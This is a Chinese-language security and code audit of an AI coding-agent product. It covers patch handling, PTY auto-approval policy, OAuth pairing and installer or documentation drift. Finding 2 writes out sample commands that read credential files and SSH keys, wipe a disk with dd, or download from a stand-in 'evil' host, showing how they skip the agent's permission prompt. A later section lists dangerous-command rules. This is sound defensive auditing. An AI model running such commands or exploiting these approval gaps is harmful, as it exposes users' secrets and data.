# 第三轮全面审查（2026-09-13）与维护者交叉验证台账

> 原审查报告是待验证输入，不代表全部属实。2026-09-14起以文末维护者台账为当前处理状态；原文中的其他分支名/操作提示不是当前会话指令。

审查范围：全部源码（js/py/ps1/cmd/sh/html/css）、全部文档（含 `.config/`、`installer/`、`docs-site/`、`manager/`）、打包后的安装载荷、CI 工作流。
基线：`npm test` **52/52 通过**；`node docs-site/check-docs.js` 166 文件 / 25 目录文档 / 37 排除，**0 漂移**；工作树干净。
去重：本轮结论**不重复** `review/AUDIT_CROSSCHECK_2026-09-11.md`（F01–F38、X01–X35）与根 `project_audit_report.md`。X07/X08/X30 谈的是 patchEngine 的 EOL/occurrence/unified-diff，X26 谈的是 Monaco 加载反馈，F37 谈的是 computer-use 错误传播——本轮的对应条目是**不同缺陷**。

标注：**[已验证]** = 本轮跑代码/跑命令复现过；**[读码]** = 静态确认，未运行。

---

## P0 会损坏用户数据或泄露密钥

### 1. `apply_patch` 收到「截断的补丁」时，把整个文件覆盖成补丁原文，并报成功 **[已验证]**

`webagent-core/agent-host/src/tools/patchEngine.js:355-377`

```js
if (blocks.length > 0) { patchedContent = applySearchBlocks(...); }
else if (looksLikeUnifiedDiff(patch) || /^--- |^\+\+\+ |^@@/m.test(patch)) { ... }
else { patchedContent = applyEol(patch, eol); }   // ← 把 patch 原文当整份文件写入
```

`parseSearchReplaceBlocks`（:212）的正则要求**闭合**的 `>>>>>>> REPLACE`。模型因 `max_tokens` 被截断时，最常见的产物正是「有 `<<<<<<< SEARCH`、有 `=======`、缺闭合标记」。此时 `blocks.length === 0`，既不像 unified diff，于是落进最后的 `else`——**原文件被补丁文本整体替换**，`applyPatch` 不抛错，MCP 侧看到一次"成功编辑"和一份看起来正常的 diff。

实测（工作区临时目录，原文件 `print("a")\nprint("keep")\n`，已按正常流程先 `read_files` 取 hash）：

| 输入 | 结果 | 落盘内容 |
|---|---|---|
| `<<<<<<< SEARCH\nprint("a")\n=======\nprint("b")\n`（缺闭合标记） | **成功，不抛错** | `<<<<<<< SEARCH\nprint("a")\n=======\nprint("b")\n` ← `print("keep")` 丢失 |
| `<<<<<<< SEARCH\n=======\nprint("b")\n>>>>>>> REPLACE\n`（空 SEARCH） | 正确拒绝 `E_BAD_ARGS` | 原样 |
| 6 个尖括号的标记 | 成功（`<{5,}` 宽松，属设计） | 正常替换 |

空 SEARCH 已有守卫（:243），**截断这条没有**。`rejectUnsupportedPatchFormat`（:197）的 `if (blocks && blocks.length) return;` 只挡 V4A，同样挡不住 0 blocks。

修：在 `applyPatchBody` 里，若 `blocksEarly.length === 0` 且 `/^<{5,}\s*SEARCH/m` 或 `/^={5,}\s*$/m` 命中，抛 `E_BAD_ARGS` + `retryHint`（"补丁被截断，请重发完整 SEARCH/REPLACE"），不要落进整份文件分支。返回值也没有 `ok` 字段（实测 `r.ok === undefined`），调用方无法据 `ok` 区分。

### 2. 桌面 PTY 的"只读自动批准"允许**无提示**读出 MCP 密钥与全部模型 API Key **[已验证]**

`webagent-core/extension/ptyPolicy.js:3`

```js
const READISH = /^(?:...|(?:cat|type|Get-Content) [A-Za-z0-9_./:\\-]+|echo ...)$/i;
```

路径字符类含 `/ . \ :`，无工作区约束。实测 `shouldAutoAllow(cmd, {})`：

```
AUTO-ALLOW  "cat .webagent/config.json"        reason=readish   ← MCP secretKey + 所有模型 apiKey
AUTO-ALLOW  "type .webagent\config.json"       reason=readish
AUTO-ALLOW  "Get-Content .env"                 reason=readish
AUTO-ALLOW  "cat ../../../etc/passwd"          reason=readish
AUTO-ALLOW  "cat C:\Users\me\.ssh\id_rsa"      reason=readish
AUTO-ALLOW  "cat .webagent/memory/2026-09-13.md" reason=readish
AUTO-ALLOW  "git diff"                         reason=readish   ← 可 dump 被跟踪文件里的密钥
```

`SECURITY.md` 的说法是「敏感路径拦截**只作用于文件工具**……`run_command "cat .env"` 可以读出内容」，以及「只读自动批准只接受保守完整命令」。两句都没说**这条路径连确认弹窗都不出现**。F11 修的是"前缀判断过宽"，改成了 `^...$` 全匹配——`cat x && curl y` 确实被 `COMPOUND` 挡住了，但**单条 `cat` 读密钥文件仍然是零交互的**。

同一份策略里，用户一旦点过一次「本会话都允许」（`allowSession=true`），实测 `dd if=/dev/zero of=/dev/sda`、`npm publish`、`Invoke-WebRequest http://evil/x -OutFile y` 全部变成 `AUTO-ALLOW reason=session`（`ptyPolicy.DANGEROUS` 要求 `curl ... |` 有管道才命中）。这个降级在 `PTY扩展详解.md` / `SECURITY.md` 里都没有写明。

修：`READISH` 的 `cat|type|Get-Content` 分支必须先过 `tools/sensitive.js` 的敏感规则 + `resolveSafePath` 的工作区约束，命中即退回弹窗；`allowSession` 不应覆盖敏感路径读取。

### 3. `run_command` 被取消后仍报 `ok: true`——已有的守卫被下一行覆盖 **[读码]**

`webagent-core/agent-host/src/tools/executor.js:277` 与 `:284`

```js
rec.ok = rec.status !== 'cancelled' && result.ok === true;   // :277 正确的守卫
rec.stdout = ...; rec.stderr = ...; rec.exitCode = ...;
rec.ok = result.ok;                                          // :284 直接覆盖，守卫失效
```

`ptyHost.handleCancel`（`extension/ptyHost.js`）恰好回 `{state:'done', status:'done', ok:true}`，而取消路径在 `executor.js:157` 已置 `rec.status='cancelled'; rec.ok=false`。`.then` 里 `if (rec.status !== 'cancelled')` 保住了 status，**`ok` 被 :284 改回 true**。`publicRecord`（:89）于是返回 `{status:'cancelled', ok:true}`，自相矛盾。删掉 :284 即可。

### 4. `scrubEnv` 漏掉一半真实凭据变量，且同一份代码复制在两处 **[已验证]**

`webagent-core/agent-host/src/tools/executor.js:60`、`webagent-core/extension/ptyHost.js`（逐字重复）

```js
/(?:api[_-]?key|access[_-]?token|secret|password|credential|private[_-]?key)|^(?:github_token|gh_token|npm_token)$/i
```

实测各变量是否被子进程继承：

```
LEAKED  NGROK_AUTHTOKEN            LEAKED  ANTHROPIC_AUTH_TOKEN
LEAKED  CLOUDFLARE_API_TOKEN       LEAKED  HF_TOKEN
LEAKED  CF_TUNNEL_TOKEN            LEAKED  AZURE_STORAGE_KEY
LEAKED  TUNNEL_TOKEN               LEAKED  WEBAGENT_TELEMETRY_TOKEN
LEAKED  AWS_ACCESS_KEY_ID          LEAKED  WEBAGENT_ADMIN_TOKEN
SCRUBBED AWS_SECRET_ACCESS_KEY     SCRUBBED GITHUB_TOKEN / OPENAI_API_KEY / CODE_SERVER_PASSWORD
```

`CF_TUNNEL_TOKEN` / `NGROK_AUTHTOKEN` 正是本产品自己的隧道文档让用户 `set` 的变量（`隧道使用指南.md`），而 `run_command` 是模型可驱动的。`SECURITY.md` 只承诺"不写日志"，没有承诺"不给子进程"。
修：改成白名单式（只透传 PATH/HOME/TEMP/LANG/SHELL/COMSPEC/…），或至少补 `auth[_-]?token|_token$|token$|access[_-]?key`。两份 `scrubEnv` 应抽到一处，否则修一处漏一处。

### 5. `runChat` 同文件两个不同的 mode 默认值，其中一个是**任何工具都不认的** **[读码]**

`webagent-core/agent-host/src/agent/runChat.js:204` → `const mode = payload.mode || 'ask';`
`webagent-core/agent-host/src/agent/runChat.js:535` → `const mode = payload.mode || 'agent';`

工具注册表里没有名为 `'agent'` 的 mode（只有 `ask|plan|code`）。走 :535 那条入口且省略 `mode` 的调用方，会得到**空工具集 + 只读提示词**，而且不报错。目前 workbench 和 extension 都显式传 mode（extension 的 `modeFromChatRequest` 默认 `'code'`），所以是**潜在陷阱**而非现行故障；但 `/api/chat` 是公开契约，第三方 MCP 客户端不传 mode 就会静默降级。

---

## P1 真实缺陷

### 6. `customizations.js` 会把读不出来的配置**静默覆盖成默认值** **[已验证]**

`webagent-core/agent-host/src/models/customizations.js` — `loadCustom()` 吞掉所有异常返回默认；`patchCustom(partial)` 执行 `saveCustom({...loadCustom(), ...partial})`。

实测：先写入损坏的 `customizations.json`（`{"instructions":"用户重要的自定义指令","broken`），再 `patchCustom({preference:'x'})` → 磁盘上变成默认模板，**用户的 `instructions` 永久丢失**。

这正是 F29 在 `store.js` 里修掉的同类问题（store 明确"绝不覆盖读不出来的配置"）。此外 `saveCustom` 用裸 `fs.writeFileSync` 连写 4 个文件（`customizations.json` / `instructions.md` / `preference.md` / `tech-stack.md`），**非原子、无 0600、无 finally**，与 `store.save` 的原子发布不一致。

### 7. `classifyToolError` 用子串猜错误层，把"文件不存在"误报成"参数非法" **[已验证]**

`webagent-core/agent-host/src/mcp/errors.js` — 匹配顺序里 `/requires |required/i` 排在 `/not found/i` 之前：

```
"File not found: \"requirements.txt\""  -> execution E_NOT_FOUND   ✅
"File not found: \"required.md\""       -> protocol  E_BAD_ARGS    ❌
"Path not found: \"a/required.txt\""    -> protocol  E_BAD_ARGS    ❌
"Directory not found: \"timeout\""      -> execution E_NOT_FOUND   ✅（侥幸）
```

任何路径里含 `required`（如 `required/` 目录）或 `timeout` 的 not-found，都会被误标成协议层错误，MCP 客户端据此判断"是我的参数写错了"而不是"文件不在"。`/timeout/` 那条同理会把 `File not found: "timeout.log"` 归成超时。
修：按 `err instanceof ExecutionError/ProtocolError` 分类优先，message 子串只做兜底；或调整顺序让 `not found` 先匹配。

### 8. `git_status` 返回的分支名在第一个点处被截断 **[已验证]**

`webagent-core/agent-host/src/tools/gitOps.js` — `(summary.match(/##\s+([^\s.]+)/) || [])[1]`

```
"## main...origin/main [ahead 1]"  -> "main"        ✅（靠 . 停住）
"## release/1.2.3"                 -> "release/1"   ❌
"## feature/v1.2"                  -> "feature/v1"  ❌
"## HEAD (no branch)"              -> "HEAD"        ✅
```

`[^\s.]+` 是为了在 `main...origin/main` 处停下，但代价是所有含点的分支名都被截断。这个值出现在 `workspace_info.git.branch`，模型会拿它去 `git checkout`。修：`/^##\s+(\S+?)(?:\.\.\.|$|\s)/`。

### 9. 未认证的 `/oauth/register` 可以踢掉正在使用的 ChatGPT 配对 **[读码]**

`webagent-core/agent-host/src/mcp/oauth.js:17 MAX_CLIENTS = 80`、`:145-159 pruneClients()`、`:451 registerHandler`

`POST /oauth/register` 只有 `rateLimit('reg:'+ip, 20, 60s)`，无认证。`registerClient` 先调 `pruneClients()`，其 `while (clients.size >= MAX_CLIENTS)` 会挑最老的 client 并**`revokeClientTokens(oldestId)`**。远程攻击者经隧道连打 80 次注册（4 分钟，限流内），就能撤销合法客户端的 access/refresh token，把用户的会话打断。`MAX_CLIENTS` 限的是客户端数，**不限单个 `redirect_uris` 数组长度**（:168 只做 `filter(Boolean)`），也不限 `client_name` 长度 → 内存放大。

### 10. 5 次错误配对码会**全局**作废，任何未认证 GET 都能换一张新码 **[读码]**

`oauth.js:76-88 consumePairing` 在 `attempts > 5` 时 `pairing = null` 并返回 429；`oauth.js:461 GET /oauth/authorize` 无条件调 `ensurePairing()`，快照为空即 `issuePairing()` 发新码。

`GET/POST /oauth/authorize` **没有任何限流**（对比 register 有）。攻击者不需要爆破——码空间是 `32^8 ≈ 1.1e12`（:30-33），爆破不可行；但只需「5 次乱填 + 1 次 GET」就能让用户工作台 Bridge 页正在显示的那张码**静默失效**，用户照抄必然得到"配对码不正确"，且没有提示说码已经换了。`pairing` 是单例全局（`OAuth授权详解.md:30` 已注明"不会保留多个客户端各自的码"），所以任何远程调用方都能影响本机用户。

### 11. `registerClient` 不校验 `redirect_uris` 的 scheme/host **[读码]**

`oauth.js:168` 接受任意字符串数组。`completeAuthorize`（:286）做的是精确 `includes` 匹配，本身安全，但注册环节允许 `javascript:`、`data:`、`http://` 与任意长度串入库。授权码只会重定向到"已注册"的 URI，而注册是未认证的——第 9 条的组合让它有实际意义。至少应要求 `https:`（或显式允许 `http://127.0.0.1`/`http://localhost`）并限长限数。

### 12. `requestOrigin` 回落到攻击者可控的 `Host` 头，并被插进未转义的 `WWW-Authenticate` **[读码]**

`oauth.js:35-40`：`config.publicTunnelUrl` 为空时，`host = req.headers['x-forwarded-host'] || req.headers.host`。该值直接成为 `authorizationServerMetadata` 的 `issuer` 与各 `*_endpoint`（:440/:443/:446），并被 `wwwAuthenticate(origin)`（:116-118）用模板串拼进 `Bearer realm="Web Agent", resource_metadata="${origin}/..."`，**没有对 `"` 做转义**。`server.js:35` 会把它写成响应头。

缓解：CR/LF 会被 Node 的 `setHeader` 拒掉（`ERR_INVALID_CHAR`），所以不是响应拆分；且只在未挂隧道时才走 Host 回落。但"`WEBAGENT_BIND=0.0.0.0` 时同网段伪造 Host → MCP 客户端拿到指向攻击者的 issuer"仍然成立。修：Host 回落前做 `localhost|127.0.0.1|[::1]|<配置的公网域名>` 白名单，否则用 `127.0.0.1:port`；header 值做 `"` 转义。

### 13. `providers.listRemoteModels` 的 fetch 没有超时 **[读码]**

`webagent-core/agent-host/src/agent/providers.js` — 远端 hang 住时 `/api/providers/probe` 一起 hang，工作台设置页的"测试连接"永久转圈。同仓库其它出站调用都有期限（`SECURITY.md` 写明"模型响应120秒期限"）。加 `AbortSignal.timeout()`。

### 14. `board.js` 的临时文件名不匹配 `.gitignore`，崩溃后留在用户仓库里 **[已验证]**

`webagent-core/agent-host/src/tools/board.js:47-49`

```js
const tmp = `${file}.${process.pid}.tmp`;
fs.writeFileSync(tmp, JSON.stringify(board, null, 2), 'utf8');
fs.renameSync(tmp, file);
```

`.gitignore:12` 的模式是 `*.tmp.*`（要求 `.tmp` 后面还有内容），`board.json.1234.tmp` **匹配不上**。同仓库 `patchEngine.tempSibling` 用的是能被匹配的命名。且这里没有 `try/finally` 清理、没有 `mode: 0o600`。写盘中途崩溃 → 用户 `git status` 里多一个不认识的未跟踪文件。

### 15. 工作台显示的 "N active" MCP 会话数是假的 **[已验证]**

`webagent-core/workbench/js/bridge.js:48-51`

```js
const active = sess ? (sess.httpSessions || (sess.alive ? 1 : 0) || sess.clients || 0) : 0;
const parts = ['Streamable HTTP', `${active} active`];
```

`sess.httpSessions` 来自 `src/mcp/session.js:49` 的 `httpSessions.size`；`SESSION_TTL_MS = 24h`（:5），而 `pruneHttpSessions()` **只在 `createHttpSession()` 里被调用**（:66），没有定时器。于是这个数字单调增长（上限 `MAX_HTTP_SESSIONS = 200`），只有在"新会话到来"时才回收超过 24h 的旧条目。昨天调用过一次 MCP、今天打开工作台，仍然显示 `1 active`。与 `usage/README.md` 自我要求的一致（"界面 telemetryConfigured 只反映部分配置状态"）不同，这里没有任何 caveat 文案。改成显示 `sessions（24h 内）`，或加定时 prune。

### 16. `computer-use/` 截图白名单伸到工作区之外，远程 MCP 可 base64 读出其中的图片 **[读码]**

`webagent-core/agent-host/src/agent/computerUse.js:18`

```js
const COMPUTER_USE_DIR = path.resolve(__dirname, '../../../../computer-use');
```

从 `webagent-core/agent-host/src/agent/` 上跳四级 = **仓库根的 `computer-use/`**，而 `workspaceRoot` 默认是仓库根的 `workspace/`。文件工具的路径约束（`resolveSafePath`）以工作区为界，`resolveShotPath`（:57）的白名单却额外放行了这个界外目录，仓库里现存约 270 张截图。

`findShotCandidates`（:30-40）的 `reBare = /[^\s"'=<>|]+\.(?:png|jpe?g)\b/gi` 扫的是 `command + stdout` 的**全部文本**，所以模型只要 `run_command "echo computer-use/shots/xxx.png"`，输出里出现的路径就会被自动附成 base64 图片块回传给远端 MCP。`SECURITY.md` 的"拿到完整 MCP 地址的人可以：读工作区里未标敏感的文件"没有覆盖这条——它读的是**工作区外**。修：把 `COMPUTER_USE_DIR` 限制在 `workspaceRoot` 内，或在 SECURITY.md 明确披露这个例外及其含义。

### 17. 安装器 `launch.js` 的 `ready()` 写死 `127.0.0.1:3000/healthz` **[读码]**

`installer/launch.js` — 忽略 `CODE_SERVER_PORT`。用户改了端口（文档明确支持）就等满 120 秒超时，然后报"启动失败"，而服务其实是好的。

### 18. 安装器 `launch.js` 用 `npm ci --omit=dev` 抹掉 acorn，文档站与两个测试随即崩溃 **[已验证]**

`installer/launch.js ensureDependencies` → `npm ci --omit=dev`。acorn 是 `webagent-core/agent-host/package.json` 的 devDependency，而：

- `docs-site/check-docs.js:22` 用相对路径 `require('../webagent-core/agent-host/node_modules/acorn')`
- `tests/documentationPolicy.test.js`、`tests/documentationLearning.test.js` 经由 check-docs 间接依赖它

实测删掉 `node_modules/acorn` 后：`node docs-site/check-docs.js` → `ENOENT acorn`；`npm test` → **2 个测试文件失败**（其余 50 通过）。已恢复 acorn，工作树干净。

### 19. 文档里写的 Windows 快速开始顺序，跑完安装器后必然失败 **[已验证]**

`run-tests.cmd` 只在 `node_modules/express` 不存在时才 `npm install`。第 18 条的 `npm ci --omit=dev` 之后 express 在、acorn 不在 → 跳过安装 → 同样 2 个测试文件失败。也就是说：**照 `安装说明`/`installer/README.md` 跑一遍安装，再照测试文档跑 `run-tests.cmd`，得到红灯**。
根因是 `check-docs.js` 跨目录 require 另一个包的 devDependency。修：acorn 移到 `docs-site/package.json` 自己的依赖，或 `check-docs.js` 用 `createRequire` + 优雅降级，并让 `run-tests.cmd` 检查 acorn 而不只是 express。

### 20. `.gitattributes` 缺 `*.sh text eol=lf` **[已验证]**

```
* text=auto
*.cmd text eol=crlf
*.bat text eol=crlf
```

`git ls-files --eol` 显示 4 个 `.sh`（`run-webagent.sh`、`run-webagent-vscode.sh`、`run-admin.sh`、`webagent-core/start-webagent.sh`）只有 `attr/text=auto`。Windows 上检出会得到 CRLF 的 shell 脚本 → `bad interpreter: /bin/bash^M`。`.cmd/.bat` 已经显式处理了，`.sh` 是对称的遗漏。

### 21. `syncExtension()` 漏拷 `.md`，也不清理旧版本目录 **[读码]**

`installer/package.js` 只拷 `package.json` / `*.js` / `icon.svg`。但仓库里**已提交的** `extensions-installed/webagent.webagent-core-0.6.9/` 含有 `PTY扩展详解.md`、`入口与Webview.md`、`resources/README.md`。重新打包得到的载荷与仓库内已提交副本不一致（`extensionCopy.test.js` 只比 `extension/` vs `extensions-installed/`，不覆盖 package.js 的产物）。另外没有旧版本目录清理，升级后 `extensions-installed/` 会同时存在 0.6.8 与 0.6.9。

### 22. `docs-site` 在安装载荷里是不可运行的 **[读码]**

`docs-site/build.js` 需要读根 `DOCUMENTATION_SUMMARY.md`，而 `installer/package.js` 的 allowlist 不含它 → 安装后运行即 `ENOENT` 崩溃；`serve.js` 无条件先 rebuild，所以文档站也起不来；`serve.cmd` 同样不在载荷里。要么把它排除出安装产物并在 README 说明"文档站仅在源码仓库可用"，要么补进 allowlist。

### 23. 工作台从 `cdn.jsdelivr.net` 加载 Monaco，而同一页面显示 MCP 密钥 **[读码]**

`webagent-core/workbench/js/monaco.js` — 硬编码 CDN，失败后静默降级（X26 已记录 7 秒上限与反馈问题，**这里说的是另一件事**）：

1. 离线 / 内网 / CDN 被墙时编辑器功能缺失，且首次失败前用户不知道为什么；
2. 承载 `secretKey`（`SECURITY.md` 明确说 `GET /api/status` **仍带** secretKey）的页面从第三方域拉可执行脚本，属于供应链与隐私暴露面。`SECURITY.md` 完全没有提到任何外部网络依赖。
修：随包 vendored 一份 Monaco，或至少在 SECURITY.md 与 README 里披露 CDN 依赖及降级行为。

### 24. 点"内置浏览器"卡片会自动开启公网隧道 **[读码]**

`webagent-core/workbench/app.js openSite()` — 用户点一张看起来只是"打开站点预览"的卡片，副作用是拉起 cloudflared Quick Tunnel 并产生一个公网地址。`SECURITY.md` 强调"做完应点『停止 Bridge』"，但这个入口没有对应的视觉提示或确认。

### 25. `run-code-oss` 的 `trustedOrigins` 只认 `127.0.0.1` / `localhost` **[读码]**

`webagent-core/scripts/run-code-oss.js` — 但 `WEBAGENT_BIND=0.0.0.0` 是文档支持的配置（8 份 md 提到）。从局域网另一台机器用 `http://192.168.x.x:3000` 打开时，Origin 不在白名单 → code-server 拒绝。两份文档都没有说这两个开关互斥。

### 26. `CODE_SERVER_PASSWORD` 分支不写 passwordFile，控制台却打印"存在 …" **[读码]**

`webagent-core/scripts/codeServerAuth.js` + `run-code-oss.js` — 用环境变量传密码给子进程时不落盘（这是对的），但启动日志仍打印 `存在 ${auth.passwordFile}`，指向一个不存在的文件。`编辑器编排详解.md:44` 已经如实记录了"环境密码分支未必实际写该文件"，**日志本身没修**。用户会去找一个不存在的文件。

---

## P2 文档与代码不一致

### 27. `.config/code-server/README.md:32` 断言的行为被测试明确禁止 **[已验证]**

> 命令行还会加 `--disable-workspace-trust`、`--trusted-origins`（仅 `127.0.0.1` / `localhost`）……

`webagent-core/agent-host/tests/codeServerNotRunnable.test.js:46`：

```js
assert.ok(!runner.includes('--disable-workspace-trust'), 'workspace trust must stay on by default');
```

`架构导读.md:307` 也说 workspace trust 保持开启。**文档说加了，代码和测试说必须不加。**
更值得注意的是结构性问题：`docs-site/documentation.config.json` 把整个 `.config/` 排除（理由"历史运行配置，已有目录说明；不扫描用户配置正文"），于是这份**手写散文文档**永远不进 CI 的覆盖率统计，漂移无人发现。同类盲区还有 `workspace/`、`webagent-repro/`。建议：排除"用户数据正文"但保留对目录内 `README.md` / `*.md` 的链接与断言校验。

### 28. `网页VSCode使用指南.md:115` 引用了不存在的环境变量，且句子不通 **[已验证]**

> 同样需要 npm 网络。也可用环境变量 `CODE_SERVER_PATH` 以外的端口：

全仓库代码里**没有任何地方读 `CODE_SERVER_PATH`**（`grep` 无命中）。紧跟的代码块用的是正确的 `CODE_SERVER_PORT` / `AGENT_HOST_PORT`。应改为"也可用环境变量指定别的端口"。

### 29. 三份文档对"主入口"的说法互相矛盾 **[已验证]**

| 来源 | 说法 |
|---|---|
| `README.md:44` | `run-webagent-vscode.cmd` = **"第二种跑法"**；:55/:63 快速开始用 `run-webagent.cmd` |
| `使用指南.md:70` | **"推荐入口（默认壳，第四阶段起）：`run-webagent-vscode.cmd`（安装器桌面图标也指向它）；`run-webagent.cmd` 经典工作台作备用"** |
| `installer/webagent.iss` | PostInstall 默认 = `run-webagent-vscode.cmd` |
| `run-webagent.cmd` 自身头部注释 | **"Windows 本机主入口"** |

安装器与使用指南一致（vscode 壳为默认），README 与脚本自述相反。新用户照 README 走会得到与桌面图标不同的东西。

### 30. `SECURITY.md` 完全没有提到用量上报 **[已验证]**

代码里存在 `WEBAGENT_TELEMETRY_URL` + `WEBAGENT_TELEMETRY_TOKEN`（`src/usage/tracker.js`），上报 payload 含 **installId + GitHub 用户名 + 工具调用统计**。`admin-host/README.md:28` 自己写了"payload 包含安装 ID 和可选 GitHub 身份，因此不是完全匿名"，`用量上报详解.md:21` 也写了"不含模型 Key、MCP secret 或命令正文，但仍含身份标识"。但 `SECURITY.md`——那份对外的隐私/威胁模型文档——`grep "遥测\|telemetry\|上报\|installId\|admin-host"` **零命中**。默认关闭（需同时配两个变量）不改变"安全文档应披露数据外发通道"这一点。

### 31. `WEBAGENT_AGENT_HOST_URL` 在 0 份文档里出现，但发行版扩展在读它 **[已验证]**

`webagent-core/extension/extension.js:20`（以及已安装副本同位置）。`grep -rl WEBAGENT_AGENT_HOST_URL --include=*.md` → 无结果。这是桌面 VS Code 用户改 agent-host 端口的唯一途径，却没写进 `桌面VSCode扩展使用指南` 或 `使用指南.md` 第 5 节。
反向的一条：`WEBAGENT_GITHUB_CLIENT_SECRET` 只出现在 `GitHub身份详解.md`，不在 `SECURITY.md` 的密钥小节（那里只泛称"GitHub App Client ID/Secret"），可以接受但最好对齐。

### 32. `DOCUMENTATION_SUMMARY.md` §5 的目录清单少于实际清单

§5 列约 21 个目录，`docs-site/documentation-manifest.json` 实为 **25**。`build.js` 依赖这份文件（见第 22 条），所以它既是文档又是构建输入，陈旧影响更大。

### 33. `测试说明.md` 的测试文件表只列了 30 个，实际 52 个

22 个测试文件在总表里缺席。（`tests/README.md` 通过 15 篇"详解"覆盖了全部 52 个，所以不是完全无文档——缺的是根级那份总表。）

### 34. 打包载荷里有 82 个失效相对链接

排除自动生成的 `source-index.md`（658 个）之后，被 `installer/package.js` 收进载荷的 `.md` 中有 **82** 个相对链接指向不存在的目标：`README.md` 13、`总览.md` 14、`使用指南.md` 9、`组件说明.md` 9、`installer/README.md` 4，其余分散。这些链接在源码仓库里可能有效（指向未被打包的兄弟文件），在**安装后的用户机器上必然 404**。需要在打包时改写为文档站绝对路径，或把目标文件一并收入。

### 35. `代码级文档方案新.md` / `代码级文档方案旧.md` 含 32 个不可跟随的示例链接

如 `](../../src/core/main.py)`、`](相对链接)`、`](由脚本生成的相对链接)`。它们是**示意性**的（讲方案，不是真链接），但渲染后与真链接无法区分，读者点了会 404。建议改成行内代码 `` `../../src/core/main.py` `` 而非 markdown 链接。根目录其它 md 的链接经全量检查**全部有效**（含 `review/CHECKLIST_WINDOWS.md`、`Windows新手逐步验收.md`、`Conda环境说明.md`、`代码复盘指南.md` 等）。

### 36. `README.md:9` 关于 `main` 分支的说法准确，无需修改 **[已验证]**

`git log -1 origin/main` → `5837ed2 feat: ShunCode core repro`，确实是更早的原型。此条**列出以避免下一轮误报**。

---

## P3 性能 / 脆弱性 / 卫生

### 37. 每次模型调用都同步重读 skills 目录

`src/tools/skills.js` 的 `listSkills` / `loadSkill` / `bundledSkills` 在 `mcp/instructions.js getInstructions()`（每次 MCP initialize）、`systemPrompt()`（**每次模型调用**）、`tools/workspaceInfo.js` 三条链上被反复调用，全是同步 fs IO。无缓存、无 mtime 校验。与 `models/profile.js resolveTechStack`（每次模型调用同步读 fs）、`usage/tracker.js`（每次工具调用 `writeFileSync`）属同一类问题。

### 38. `globToRegExp` 的未文档化限制与宽松匹配

`src/tools/findFiles.js`：`{a,b}` 花括号被转义而非展开，`!` 取反不支持；`*.js` 因为额外测 `re.test(entry.name)` 会匹配**任意深度**的同名文件（与标准 glob 的顶层语义相反）；`visited > 10000` 截断与 `maxResults` 上限 200（`Math.min(200, …)`）都没写进工具描述，而描述里只说"Always set maxResults (default 40)"。

### 39. `ptyHost.spawnSpec` 在 Windows 上写可预测的临时 `.ps1`

`extension/ptyHost.js` — 命令含换行/非 ASCII/超过 400 字符时写入 `os.tmpdir()/webagent-pty-${Date.now()}-${Math.random().toString(16).slice(2)}.ps1`，再以 `-ExecutionPolicy Bypass -File` 执行。`Math.random()` 非密码学随机，且写入到执行之间存在 TOCTOU 窗口（同机其他进程可覆写）。清理只在 `proc.onExit` 里做，VS Code 直接退出则残留。建议改用 `crypto.randomBytes` + `fs.writeFileSync(file, text, { mode: 0o600 })`，并在 `dispose()` 里兜底清理。

### 40. `ptyHost` 每个输出块发一次 HTTP，无背压

`onData` 里 `this.postJob(job.jobId, {state:'progress', stdout: ...}).catch(()=>{})` —— fire-and-forget，无队列、无合并、无并发上限。跑一个输出密集的命令会瞬间打出成百上千个并发请求到本机 48271。

### 41. 两套互相分歧的"危险命令"策略

`src/tools/dangerous.js`（远程 MCP 路径）拦 `dd`、`shred`、`truncate`、`mkfs`、`bitsadmin`、`schtasks`、`reg add`、`net user`、`shutdown`；`extension/ptyPolicy.js` 的 `DANGEROUS` **一条都没有**。同一条 `dd if=/dev/zero of=/dev/sda` 在远程被硬拒，在桌面 PTY 只是弹一个带"同类都允许"按钮的窗（点下去就整会话放行，见第 2 条）。一个产品两套策略、两份词表，长期必然继续分歧。建议合并为一份共享模块。

### 42. 版本号 `0.6.9` 硬编码在 4 处

`extension/package.json`、`extensions-installed/webagent.webagent-core-0.6.9/package.json`、`installer/webagent.iss`（AppVer）、以及目录名本身。`tests/extensionCopy.test.js` 还把目录名字面量写死。升版本要改 4 处 + 重命名目录 + 改测试，任一处漏掉就是静默不一致。`src/extensionVersion.js` 已存在，应作为单一来源。

### 43. `scripts/run-tests.js` 的手写 `preferred` 基线与 `tests/README` 的政策冲突

runner 里维护了一份固定清单并在缺失时 `exit(1)`，而 `tests/README.md` 明确反对固定清单（要求按目录发现）。新增测试文件忘记登记 → CI 红，但不是因为代码坏。

### 44. `npm test` 在"提交日的次日及以后"必然弄脏被跟踪的 `docs-site/content.js` **[已验证]**

`content.js` 第 2 行的 `window.DOCS` 里带 `"builtAt":"2026-09-12"`——是**日期**而非时间戳。今天（09-13）实测：跑一次 `npm test` → `builtAt` 变成 `2026-09-13` → `git status` 出现 ` M docs-site/content.js`（本轮已 `git checkout --` 恢复）。

两层问题：
1. **仓库卫生**：任何开发者在提交日的次日跑测试都会得到一个与代码无关的 diff，很容易被顺手提交，制造噪音历史；`documentation.config.json` 又把 `docs-site/content.js` 排除在清单外（理由"由 Markdown 生成的文档站内容"），所以 `check-docs.js` 不会报这个漂移。
2. **生成物按定义就是过期的**：被跟踪的 `content.js` 记录的是"最后一次重建那天的日期"，而它必须与源码一起提交，于是**提交的瞬间就开始过期**。没有任何 CI 步骤校验它是否对应当前 HEAD（`test.yml` 先 `check-docs.js` 后 `npm test`，两者都不比对 `content.js` 与源文件）。

修：`builtAt` 改由构建时刻的**输入内容哈希**决定（无输入变化则输出字节不变），或让测试把站点生成到临时目录、不写工作树；并加一条 CI 断言"`node docs-site/build.js` 后 `git diff --exit-code docs-site/content.js`"。

### 45. `store.js` 的 gitignore 名单漏了 board 与 memory

`NESTED_NAMES` / `SECRET_REL` = `config.json`、`read-hashes.json`、`usage.json`。仓库自身的 `.gitignore` 另外列了 `**/.webagent/board.json`——**但那只对 web_agent 这个仓库生效，不会应用到用户的工作区**。`ensureWorkspaceGitignore()` 写进用户工作区的名单里没有 `board.json`、`memory/*.md`、`customizations.json`、`instructions.md`、`preference.md`、`tech-stack.md`。在用户的 git 仓库里这些全部是未跟踪可见文件，可能被一起提交。`board.json` 按文档"不放密钥"，但 `memory/*.md` 是模型自由书写的笔记，内容不可控。

### 46. 其它小项（各一行）

- `src/api/routes.js` — `publicOrigin(req)` 死代码，无调用点。
- `src/mcp/oauth.js:240-241` — `pairing = null; rateHits.clear();` 引用的 `rateHits` 在 `:408` 才声明（`const`，靠运行时序侥幸不触发 TDZ）。
- `src/mcp/oauth.js:214-218` — `timingSafeEqualString` 先比长度再 `timingSafeEqual`，长度本身成为旁路。
